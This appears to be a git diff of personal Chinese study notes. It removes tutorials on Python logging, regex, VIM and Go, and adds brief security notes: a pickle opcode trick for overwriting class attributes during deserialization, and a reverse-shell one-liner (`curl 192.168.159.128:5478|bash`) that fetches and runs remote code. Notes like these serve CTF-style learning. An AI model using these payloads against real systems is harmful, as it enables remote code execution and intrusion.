-`stream`：指定将日志的输出流，可以指定输出到sys.stderr，sys.stdout或者文件，默认输出到sys.stderr，当stream和filename同时指定时，stream被忽略；
-
-### 将日志写入到文件
-
-#### 将日志写入到文件
-
-设置logging，创建一个FileHandler，并对输出消息的格式进行设置，将其添加到logger，然后将日志写入到指定的文件中，
-
-```python
-import logging
-logger = logging.getLogger(__name__)
-logger.setLevel(level = logging.INFO)
-handler = logging.FileHandler("log.txt")
-handler.setLevel(logging.INFO)
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-handler.setFormatter(formatter)
-logger.addHandler(handler)
- 
-logger.info("Start print log")
-logger.debug("Do something")
-logger.warning("Something maybe fail.")
-logger.info("Finish")
-```
-
-log.txt中日志数据为，
-
-    2016-10-09 19:01:13,263 - __main__ - INFO - Start print log2016-10-09 19:01:13,263 - __main__ - WARNING - Something maybe fail.2016-10-09 19:01:13,263 - __main__ - INFO - Finish
-
-#### 将日志同时输出到屏幕和日志文件
-
-logger中添加StreamHandler，可以将日志输出到屏幕上，
-
-```python
-import logging
-logger = logging.getLogger(__name__)
-logger.setLevel(level = logging.INFO)
-handler = logging.FileHandler("log.txt")
-handler.setLevel(logging.INFO)
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-handler.setFormatter(formatter)
- 
-console = logging.StreamHandler()
-console.setLevel(logging.INFO)
- 
-logger.addHandler(handler)
-logger.addHandler(console)
- 
-logger.info("Start print log")
-logger.debug("Do something")
-logger.warning("Something maybe fail.")
-logger.info("Finish")
-```
-
-可以在log.txt文件和控制台中看到，
-
-    2016-10-09 19:20:46,553 - __main__ - INFO - Start print log
-    2016-10-09 19:20:46,553 - __main__ - WARNING - Something maybe fail.
-    2016-10-09 19:20:46,553 - __main__ - INFO - Finish
-
-可以发现，logging有一个日志处理的主对象，其他处理方式都是通过addHandler添加进去，logging中包含的handler主要有如下几种，
-
-    handler名称：位置；作用
-     
-    StreamHandler：logging.StreamHandler；日志输出到流，可以是sys.stderr，sys.stdout或者文件
-    FileHandler：logging.FileHandler；日志输出到文件
-    BaseRotatingHandler：logging.handlers.BaseRotatingHandler；基本的日志回滚方式
-    RotatingHandler：logging.handlers.RotatingHandler；日志回滚方式，支持日志文件最大数量和日志文件回滚
-    TimeRotatingHandler：logging.handlers.TimeRotatingHandler；日志回滚方式，在一定时间区域内回滚日志文件
-    SocketHandler：logging.handlers.SocketHandler；远程输出日志到TCP/IP sockets
-    DatagramHandler：logging.handlers.DatagramHandler；远程输出日志到UDP sockets
-    SMTPHandler：logging.handlers.SMTPHandler；远程输出日志到邮件地址
-    SysLogHandler：logging.handlers.SysLogHandler；日志输出到syslog
-    NTEventLogHandler：logging.handlers.NTEventLogHandler；远程输出日志到Windows NT/2000/XP的事件日志
-    MemoryHandler：logging.handlers.MemoryHandler；日志输出到内存中的指定buffer
-    HTTPHandler：logging.handlers.HTTPHandler；通过"GET"或者"POST"远程输出到HTTP服务器
-
-#### 日志回滚
-
-使用RotatingFileHandler，可以实现日志回滚，
-
-```python
-import logging
-from logging.handlers import RotatingFileHandler
-logger = logging.getLogger(__name__)
-logger.setLevel(level = logging.INFO)
-#定义一个RotatingFileHandler，最多备份3个日志文件，每个日志文件最大1K
-rHandler = RotatingFileHandler("log.txt",maxBytes = 1*1024,backupCount = 3)
-rHandler.setLevel(logging.INFO)
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-rHandler.setFormatter(formatter)
- 
-console = logging.StreamHandler()
-console.setLevel(logging.INFO)
-console.setFormatter(formatter)
- 
-logger.addHandler(rHandler)
-logger.addHandler(console)
- 
-logger.info("Start print log")
-logger.debug("Do something")
-logger.warning("Something maybe fail.")
-logger.info("Finish")
-```
-
-可以在工程目录中看到，备份的日志文件，
-
-    2016/10/09  19:36               732 log.txt
-    2016/10/09  19:36               967 log.txt.1
-    2016/10/09  19:36               985 log.txt.2
-    2016/10/09  19:36               976 log.txt.3
-
-### 设置消息的等级
-
-可以设置不同的日志等级，用于控制日志的输出，
-
-    日志等级：使用范围
-     
-    FATAL：致命错误
-    CRITICAL：特别糟糕的事情，如内存耗尽、磁盘空间为空，一般很少使用
-    ERROR：发生错误时，如IO操作失败或者连接问题
-    WARNING：发生很重要的事件，但是并不是错误时，如用户登录密码错误
-    INFO：处理请求或者状态变化等日常事务
-    DEBUG：调试过程中使用DEBUG等级，如算法中每个循环的中间状态
-
-### 捕获traceback
-
-Python中的traceback模块被用于跟踪异常返回信息，可以在logging中记录下traceback，
-
-代码，
-
-```python
-import logging
-logger = logging.getLogger(__name__)
-logger.setLevel(level = logging.INFO)
-handler = logging.FileHandler("log.txt")
-handler.setLevel(logging.INFO)
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-handler.setFormatter(formatter)
- 
-console = logging.StreamHandler()
-console.setLevel(logging.INFO)
- 
-logger.addHandler(handler)
-logger.addHandler(console)
- 
-logger.info("Start print log")
-logger.debug("Do something")
-logger.warning("Something maybe fail.")
 try:
-    open("sklearn.txt","rb")
-except (SystemExit,KeyboardInterrupt):
-    raise
-except Exception:
-    logger.error("Faild to open sklearn.txt from logger.error",exc_info = True)
- 
-logger.info("Finish")
-```
-
-控制台和日志文件log.txt中输出，
-
-    Start print log
-    Something maybe fail.
-    Faild to open sklearn.txt from logger.error
+    Target2.__dict__['A'] = 1
+except:
+    traceback.print_exc()
+    '''
     Traceback (most recent call last):
-      File "G:\zhb7627\Code\Eclipse WorkSpace\PythonTest\test.py", line 23, in <module>
-        open("sklearn.txt","rb")
-    IOError: [Errno 2] No such file or directory: 'sklearn.txt'
-    Finish
+      File "C:\Users\Lenovo\PycharmProjects\pythonProject\demo\opcode_test.py", line 85, in <module>
+        Target2.__dict__['A'] = 1
+    TypeError: 'mappingproxy' object does not support item assignment
+    '''
+```
 
-也可以使用logger.exception(msg,\_args)，它等价于logger.error(msg,exc\_info = True,\_args)，
+![image-20231018214724999](daydayup.assets/image-20231018214724999.png)
 
-将
+![image-20231018215123724](daydayup.assets/image-20231018215123724.png)
 
-    logger.error("Faild to open sklearn.txt from logger.error",exc_info = True)
+再看源码，如果 `state` 是两个元素的元组，那么会执行 `state, slotstate = state`，如果此时 `state in [None, {}]`（由于 `_pickle` 逻辑问题，是没办法让 state 等于 `''`、`0` 等这种值的），那么就会跑去执行 `setattr(inst, k, v)`，这是 mappingproxy 类型允许的
 
-替换为，
+所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 `cA\nb\n}Va\nI1\nsb.` 应该改为 `cA\nb\n(N}Va\nI1\ntsb.` 或者 `cA\nb\n(}}Va\nI1\ntsb.`
 
-    logger.exception("Failed to open sklearn.txt from logger.exception")
+## 命令执行绕过
 
-控制台和日志文件log.txt中输出，
+![命令执行绕过](daydayup.assets/命令执行绕过.jpg)
 
-    Start print log
-    Something maybe fail.
-    Failed to open sklearn.txt from logger.exception
-    Traceback (most recent call last):
-      File "G:\zhb7627\Code\Eclipse WorkSpace\PythonTest\test.py", line 23, in <module>
-        open("sklearn.txt","rb")
-    IOError: [Errno 2] No such file or directory: 'sklearn.txt'
-    Finish
+## 反弹shell
 
-### 多模块使用logging
-
-主模块mainModule.py，
-
-```python
-import logging
-import subModule
-logger = logging.getLogger("mainModule")
-logger.setLevel(level = logging.INFO)
-handler = logging.FileHandler("log.txt")
-handler.setLevel(logging.INFO)
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-handler.setFormatter(formatter)
- 
-console = logging.StreamHandler()
-console.setLevel(logging.INFO)
-console.setFormatter(formatter)
- 
-logger.addHandler(handler)
-logger.addHandler(console)
+```
+curl 192.168.159.128:5478|bash
 ```
 
 
-
-
-```python
-logger.info("creating an instance of subModule.subModuleClass")
-a = subModule.SubModuleClass()
-logger.info("calling subModule.subModuleClass.doSomething")
-a.doSomething()
-logger.info("done with  subModule.subModuleClass.doSomething")
-logger.info("calling subModule.some_function")
-subModule.som_function()
-logger.info("done with subModule.some_function")
-```
-
-子模块subModule.py，
-
-```python
-import logging
- 
-module_logger = logging.getLogger("mainModule.sub")
-class SubModuleClass(object):
-    def __init__(self):
-        self.logger = logging.getLogger("mainModule.sub.module")
-        self.logger.info("creating an instance in SubModuleClass")
-    def doSomething(self):
-        self.logger.info("do something in SubModule")
-        a = []
-        a.append(1)
-        self.logger.debug("list a = " + str(a))
-        self.logger.info("finish something in SubModuleClass")
- 
-def som_function():
-    module_logger.info("call function some_function")
-```
-
-执行之后，在控制和日志文件log.txt中输出，
-
-    2016-10-09 20:25:42,276 - mainModule - INFO - creating an instance of subModule.subModuleClass
-    2016-10-09 20:25:42,279 - mainModule.sub.module - INFO - creating an instance in SubModuleClass
-    2016-10-09 20:25:42,279 - mainModule - INFO - calling subModule.subModuleClass.doSomething
-    2016-10-09 20:25:42,279 - mainModule.sub.module - INFO - do something in SubModule
-    2016-10-09 20:25:42,279 - mainModule.sub.module - INFO - finish something in SubModuleClass
-    2016-10-09 20:25:42,279 - mainModule - INFO - done with  subModule.subModuleClass.doSomething
-    2016-10-09 20:25:42,279 - mainModule - INFO - calling subModule.some_function
-    2016-10-09 20:25:42,279 - mainModule.sub - INFO - call function some_function
-    2016-10-09 20:25:42,279 - mainModule - INFO - done with subModule.some_function
-
-首先在主模块定义了logger'mainModule'，并对它进行了配置，就可以在解释器进程里面的其他地方通过getLogger('mainModule')得到的对象都是一样的，不需要重新配置，可以直接使用。定义的该logger的子logger，都可以共享父logger的定义和配置，所谓的父子logger是通过命名来识别，任意以'mainModule'开头的logger都是它的子logger，例如'mainModule.sub'。
-
-实际开发一个application，首先可以通过logging配置文件编写好这个application所对应的配置，可以生成一个根logger，如'PythonAPP'，然后在主函数中通过fileConfig加载logging配置，接着在application的其他地方、不同的模块中，可以使用根logger的子logger，如'PythonAPP.Core'，'PythonAPP.Web'来进行log，而不需要反复的定义和配置各个模块的logger。
-
-### 通过JSON或者YAML文件配置logging模块
-
-尽管可以在Python代码中配置logging，但是这样并不够灵活，最好的方法是使用一个配置文件来配置。在Python 2.7及以后的版本中，可以从字典中加载logging配置，也就意味着可以通过JSON或者YAML文件加载日志的配置。
-
-#### 通过JSON文件配置
-
-JSON配置文件，
-
-```json
-{
-    "version":1,
-    "disable_existing_loggers":false,
-    "formatters":{
-        "simple":{
-            "format":"%(asctime)s - %(name)s - %(levelname)s - %(message)s"
-        }
-    },
-    "handlers":{
-        "console":{
-            "class":"logging.StreamHandler",
-            "level":"DEBUG",
-            "formatter":"simple",
-            "stream":"ext://sys.stdout"
-        },
-        "info_file_handler":{
-            "class":"logging.handlers.RotatingFileHandler",
-            "level":"INFO",
-            "formatter":"simple",
-            "filename":"info.log",
-            "maxBytes":"10485760",
-            "backupCount":20,
-            "encoding":"utf8"
-        },
-        "error_file_handler":{
-            "class":"logging.handlers.RotatingFileHandler",
-            "level":"ERROR",
-            "formatter":"simple",
-            "filename":"errors.log",
-            "maxBytes":10485760,
-            "backupCount":20,
-            "encoding":"utf8"
-        }
-    },
-    "loggers":{
-        "my_module":{
-            "level":"ERROR",
-            "handlers":["info_file_handler"],
-            "propagate":"no"
-        }
-    },
-    "root":{
-        "level":"INFO",
-        "handlers":["console","info_file_handler","error_file_handler"]
-    }
-}
-```
-
-通过JSON加载配置文件，然后通过logging.dictConfig配置logging，
-
-```python
-import json
-import logging.config
-import os
- 
-def setup_logging(default_path = "logging.json",default_level = logging.INFO,env_key = "LOG_CFG"):
-    path = default_path
-    value = os.getenv(env_key,None)
-    if value:
-        path = value
-    if os.path.exists(path):
-        with open(path,"r") as f:
-            config = json.load(f)
-            logging.config.dictConfig(config)
-    else:
-        logging.basicConfig(level = default_level)
- 
-def func():
-    logging.info("start func")
- 
-    logging.info("exec func")
- 
-    logging.info("end func")
- 
-if __name__ == "__main__":
-    setup_logging(default_path = "logging.json")
-    func()
-```
-
-#### 通过YAML文件配置
-
-通过YAML文件进行配置，比JSON看起来更加简介明了，
-
-```yaml
-version: 1
-disable_existing_loggers: False
-formatters:
-        simple:
-            format: "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
-handlers:
-    console:
-            class: logging.StreamHandler
-            level: DEBUG
-            formatter: simple
-            stream: ext://sys.stdout
-    info_file_handler:
-            class: logging.handlers.RotatingFileHandler
-            level: INFO
-            formatter: simple
-            filename: info.log
-            maxBytes: 10485760
-            backupCount: 20
-            encoding: utf8
-    error_file_handler:
-            class: logging.handlers.RotatingFileHandler
-            level: ERROR
-            formatter: simple
-            filename: errors.log
-            maxBytes: 10485760
-            backupCount: 20
-            encoding: utf8
-loggers:
-    my_module:
-            level: ERROR
-            handlers: [info_file_handler]
-            propagate: no
-root:
-    level: INFO
-    handlers: [console,info_file_handler,error_file_handler]
-```
-
-通过YAML加载配置文件，然后通过logging.dictConfig配置logging，
-
-```python
-import yaml
-import logging.config
-import os
- 
-def setup_logging(default_path = "logging.yaml",default_level = logging.INFO,env_key = "LOG_CFG"):
-    path = default_path
-    value = os.getenv(env_key,None)
-    if value:
-        path = value
-    if os.path.exists(path):
-        with open(path,"r") as f:
-            config = yaml.load(f)
-            logging.config.dictConfig(config)
-    else:
-        logging.basicConfig(level = default_level)
- 
-def func():
-    logging.info("start func")
- 
-    logging.info("exec func")
- 
-    logging.info("end func")
- 
-if __name__ == "__main__":
-    setup_logging(default_path = "logging.yaml")
-    func()
-```
-
-## 正则表达式
-
-#### 捕获组
-
-使用小括号指定一个子表达式后，匹配这个子表达式的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个捕获组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。  也可以自己指定子表达式的组名。这样在表达式或程序中可以直接引用组名，当然也可以继续使用组号。但如果正则表达式中同时存在普通捕获组和命名捕获组，那么捕获组的编号就要特别注意，编号的规则是先对普通捕获组进行编号，再对命名捕获组进行编号。详细语法如下：
-
-`(pattern)`：匹配pattern并捕获结果，自动设置组号。
-
-```undefined
-(abc)+d :  匹配到abcd或者abcabcd
-```
-
-`(?<name>pattern)`或`(?'name'pattern)`：匹配pattern并捕获结果，设置name为组名。
-
- `\num`：对捕获组的反向引用。其中 num 是一个正整数。
-
-```undefined
-(\w)(\w)\2\1: 匹配到abba
-```
-
-`\k<name>`或`\k'name'`：对命名捕获组的反向引用。其中 name 是捕获组名。
-
-```csharp
-(?<group>\w)abc\k<group>  : 匹配到xabcx
-```
-
-1. `(?:pattern)` 非捕获组（Non-capturing Group）
-   `?:` 是用于创建非捕获组的语法，用于指定一个子表达式，但不将其捕获为匹配结果中的一个分组。它的语法是 `(?:...)`，其中 `...` 是一个子表达式。
-
-   示例：`(?:foo)+` 匹配一个或多个连续出现的 `foo`，但不会捕获每个 `foo` 作为匹配结果中的一个分组。
-
-2. `(?=pattern)` ：零宽度正向预查（正向零宽断言）
-   `?=` 是一个正向预查，用于指定一个必须满足的条件，但不捕获实际匹配的内容。它的语法是 `(?=...)`，其中 `...` 是一个正则表达式，表示需要满足的条件。当 `?=` 后面的内容满足 `...` 的条件时，整个表达式才算匹配，但最终匹配结果并不包含 `?=` 后面的内容，也并不会“消耗”或匹配该模式，只是确认它存在。
-
-   示例：`foo(?=bar)` 匹配 `foo`，但只有当其后紧跟着 `bar` 时才是有效的匹配。
-
-3. `(?!pattern)`：零宽度负向预查（负向零宽断言）
-
-   `?!` 是一个负向预查，用于指定一个条件，表示该条件在当前位置不应该出现。它的语法是 `(?!...)`，其中 `...` 是一个正则表达式，表示需要满足的条件。当 `?!` 后面的内容不满足 `...` 的条件时，整个表达式才算匹配。
-
-   示例：`foo(?!bar)` 匹配 `foo`，但只有当其后不紧跟着 `bar` 时才是有效的匹配。
-
-4. `(?<=pattern)`: 零宽度正向回查（也称为正向零宽断言）。
-
-   这个断言会查找前面是`pattern`的地方。例如，`(?<=a)b`会匹配所有前面是`a`的`b`。在字符串`abc`中，`b`会被匹配，因为它前面是`a`。但是，这个断言并不会“消耗”或匹配`a`，所以如果你对整个字符串进行匹配，只有`b`会被返回，而不是`ab`。
-
-   注意，正向回查中的`pattern`必须是固定长度的。也就是说，你不能在`pattern`中使用`*`或`+`这样的量词。
-
-5. `(?<!pattern)`: 零宽度负向回查（也称为负向零宽断言）。
-
-   这个断言会查找前面不是`pattern`的地方。例如，`(?<!a)b`会匹配所有前面不是`a`的`b`。在字符串`abc`中，`b`不会被匹配，因为它前面是`a`。但是，在字符串`dbc`中，`b`会被匹配，因为它前面是`d`，不是`a`。
-
-   同样，负向回查中的`pattern`必须是固定长度的。
-
-#### 分组引用
-
-上面讲完了分组，我们来看下如何来引用分组，大部分语言都是用 **反斜杠 + 编号** 的方式，个别的比如 JavaScript语言，使用的是 **美元符号 + 编号** 的方式：
-
-|  编程语言  | 查找时引用方式 | 替换时引用方式 |
-| :--------: | :------------: | :------------: |
-|   Python   | \number 如 \1  | \number 如 \1  |
-|     Go     |  官方包不支持  |  官方包不支持  |
-|    Java    | \number 如 \1  | $number 如 $1  |
-| JavaScript | $number 如 $1  | $number 如 $1  |
-|    PHP     | \number 如 \1  | \number 如 \1  |
-|    Ruby    | \number 如 \1  | \number 如 \1  |
-
-在一个目标字符串中，查找两个重复出现的单词：
-![image-20230731144219315](daydayup.assets/image-20230731144219315.png)
-
-![image-20230731144445944](daydayup.assets/image-20230731144445944.png)
-
-利用分组引用替换时间demo:
-
-```python
-print("result8".center(50, '-'))
-test_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-print(test_str)
-regex = r"(\d{4})-(\d{2})-(\d{2}) (\d{2}):(\d{2}):(\d{2})"
-subst = r"\1年\2月\3日 \4时\5分\6秒"
-result8 = re.sub(regex, subst, test_str)
-print(result8)
-# 2023-07-31 14:39:59
-# 2023年07月31日 14时39分59秒
-```
 
 ## JWT漏洞
+
+
+
+## JS原型链污染
 
 
 
@@ -5700,266 +5692,3 @@ class student extends people{
 
 
 
-## VIM
-
-### 如何从正常模式进入插入模式呢？
-
-请记住下面几个常用启动录入文本的键盘字符 `i,I,a,A,o,O,s,S` 。
-
-`i`是在光标所在的字符之前插入需要录入的文本。
-
-`I` 是在光标所在行的行首插入需要录入的文本。
-
-`a` 是在光标所在的字符之后插入需要录入的文本。
-
-`A` 是在光标所在行的行尾插入需要录入的文本。
-
-`o` 是光标所在行的下一行行首插入需要录入的文本。
-
-`O` 是光标所在行的上一行行首插入需要录入的文本。
-
-`s` 删除光标所在处的字符然后插入需要录入的文本。
-
-`S` 删除光标所在行，在当前行的行首开始插入需要录入的文本。
-
-还有一个可能经常用到的就是 `cw` ，删除从光标处开始到该单词结束的所有字符，然后插入需要录入的文本（这个命令是两个字符的合体 cw ）。
-
-### VIM 的命令模式
-
-**文本的行号设置最好不要设置在配置文件中（因为复制文件的时候行号的出现会很麻烦），在命令行实现就好**。
-
-`:set nu`该命令会显示行号。
-
-`:set nonu`该命令会取消行号。
-
-`:n`定位到 n 行。
-
-**VIM 进行关键字的查找。**
-
-`/{目标字符串}`
-
-如：/zempty 会在文本中匹配 zempty 的地方高亮。
-
-查找文本中匹配的目标字符串，查到以后，输入键盘上的 n 会去寻找下一个匹配，N 会去寻找上一个匹配。
-
-**VIM 处理大小写的区分**
-
-`:set ic`编辑器将不会区分大小写，如果你进行该设置之后，进行关键字查询如 /zempty 如果文本中有 Zempty ,zEmpty,....,只要是字符相同不会区分大小写都会进行匹配。
-
-`:set noic`该命令用来区分大小写的查询。
-
-### VIM 的正常模式
-
-**快速移动光标**
-
-几个重要的快捷键
-
-请记住这几个快捷键 `h,j,k,l` 这几个按键主要是用来快速移动光标的，`h` 是向左移动光标，`l` 是向右移动光标，`j` 是向下移动光标，`k` 是向上移动光标，`h , j , k ,l` 在主键盘区完全可以取代键盘上的 `↑ ,↓ ,← , →` 的功能。
-
-**在当前行上移动光标**
-
-`0` 移动到行头
-
-`^` 移动到本行的第一个不是 blank 字符
-
-`$` 移动到行尾
-
-`g_` 移动到本行最后一个不是 blank 字符的位置
-
-`w` 光标移动到下一个单词的开头
-
-`e` 光标移动到下一个单词的结尾
-
-`fa` 移动到本行下一个为 a 的字符处，fb 移动到下一个为 b 的字符处
-
-`nfa` 移动到本行光标处开始的第 n 个 字符为 a 的地方（n 是 1，2，3，4 ... 数字）
-
-`Fa` 同 `fa` 一样，光标移动方向同 `fa` 相反
-
-`nFa` 同 `nfa` 类似，光标移动方向同 `nfa`相反
-
-`ta` 移动光标至 a 字符的前一个字符
-
-`nta` 移动到第二个 a 字符的前一个字符处
-
-`Ta` 同 `ta` 移动光标方向相反
-
-`nTa` 同 `nta` 移动光标方向相反
-
-`;` 和`,` 当使用 f, F, t ,T, 关键字指定字符跳转的时候，使用 `；`可以快速跳转到下一个指定的字符，`,` 是跳到前一个指定的字符
-
-**跨行移动光标**
-
-`nG` 光标定位到第 n 行的行首
-
-`gg` 光标定位到第一行的行首
-
-`G` 光标定位到最后一行的行首
-
-`H` 光标定位到当前屏幕的第一行行首
-
-`M` 光标移动到当前屏幕的中间
-
-`L` 光标移动到当前屏幕的尾部
-
-`zt` 把当前行移动到当前屏幕的最上方，也就是第一行
-
-`zz` 把当前行移动到当前屏幕的中间
-
-`zb` 把当前行移动到当前屏幕的尾部
-
-`%` 匹配括号移动，包括 ( , { , \[ 需要把光标先移动到括号上
-
-`*` 和 `#` 匹配光标当前所在的单词，移动光标到下一个（或者上一个）匹配的单词（ `*` 是下一个，`#` 是上一个）
-
-## Golang
-
-`GOPATH`：Go语言项目的工作目录
-
-`GOBIN`：Go编译生成的程序的安装目录
-
-运行go程序：`go run main.go`
-
-```go
-// 代表的是一个可运行的应用程序
-package main
- 
-// 导入 fmt 包
-import "fmt"
-
-// 程序的主入口
-func main() {
-	fmt.Printf("Hello world!")
-}
-```
-
-`main`包是一个特殊的包，代表你的go语言项目是一个可运行的程序而不是被导入的库
-
-跨平台编译：
-
-`GOOS`：要编译的目标操作系统
-
-`GOARCH`：代表要编译的目标处理器架构
-
-定义变量：
-
-```
-var 变量名 类型 = 表达式
-```
-
-Go语言具有类型推导的功能，所以定义变量时可以无需刻意定义变量的类型。
-
-```
-var 变量名 = 表达式
-```
-
-定义多个变量
-
-```
-var (
-		k int = 1000
-		z = 10000
-)
-```
-
-变量的简短声明`:=`
-
-```
-j := 100
-```
-
-指针对应的是变量在内存中的存储位置，也就说指针的值就是变量的内存地址
-
-```go
-pi := &i // 取地址
-fmt.Println(pi, *pi)
-```
-
-定义常量：
-
-```go
-const name = "wi1shu"
-```
-
-`iote`常量生成器：
-
-![image-20230804161918460](daydayup.assets/image-20230804161918460-16911371597571.png)
-
-数据类型：
-
-![image-20230804160826697](daydayup.assets/image-20230804160826697.png)
-
-`int`和`uint`没有具体的bit大小，他们的大小和CPU有关，能确定int的bit就选择比较明确的int类型，这会让你的程序具备很好的移植性
-
-字节`byte`类型等价于`uint8`类型，用于定义一个字节，字节`byte`类型也属于整型
-
-浮点数就代表现实中的小数，最常用的是`float64`，因为它的精度高，浮点计算的结果相比`float32`误差会更小。
-
-Go语言中的字符串可以表示为任意的数据，通过操作符 + 把字符串连接起来，得到一个新的字符串
-
-零值其实就是一个变量的默认值，如果我们声明了一个变量，但是没有对其进行初始化，那么 Go 语言会自动初始化其值为对应类型的零值
-
-Go语言是强类型的语言，不同类型的变量是无法相互使用和计算的，这也是为了保证Go程序的健壮性，不同类型的变量在进行赋值或者计算前，需要先进行类型转换
-
-```go
-i2s := strconv.Itoa(i) // int 转 str
-s2i, err := strconv.Atoi(i2s) // str 转 int
-fmt.Println(i2s, s2i, err)
-
-i2f := float64(i)
-f2i := int(i2f)
-fmt.Println(i2f, f2i)
-```
-
-`strings`包是用于处理字符串的工具包，里面有很多常用的函数，帮助我们对字符串进行操作
-
-![image-20230804162455322](daydayup.assets/image-20230804162455322.png)
-
-复数
-
-`if`：
-
-```go
-if i2 := i / 10; i2 > 10 {
-	fmt.Println("i2 > 10")
-} else if i2 < 10 && i2 > 0 {
-	fmt.Println("i2 < 10 && i2 > 0")
-} else {
-	fmt.Println("?")
-}
-```
-
-`switch`：
-
-![image-20230804213053596](daydayup.assets/image-20230804213053596.png)
-
-`switch`的`case`从上到下逐一进行判断，一旦满足条件，立即执行对应的分支并返回其余分支不再做判断
-
-`switch`中的`fallthrough`
-
-![image-20230804213210493](daydayup.assets/image-20230804213210493.png)
-
-`case`后的值要和`;`后的表达式结果类型相同，之后`case`后的值会和`j`进行比较
-
-`switch`语句非常强大，可以将表达式直接放在后面
-![image-20230804213448271](daydayup.assets/image-20230804213448271.png)
-
- `for`：循环，三部分都可以省略
-
->```go
->for i, j := 1, 2; i < 10; i++ {
->    // 循环体 
->}
->```
->
->这种效果可以实现C++中for循环定义多变量的效果。举一反三，if等语句中也可以
-
-![image-20230804213913824](daydayup.assets/image-20230804213913824.png)
-
-Go没有`while`循环，但是Go中的`for`可以当做`while`用
-![image-20230804213956832](daydayup.assets/image-20230804213956832.png)
-
->个人总结：在这些语句中，`;`符号前面是进行赋值的语句，后面是进行比较的语句
-
-continue 可以跳出本次循环，继续执行下一个循环
-break 可以跳出整个 for 循环，哪怕 for 循环没有执行完，也会强制终止
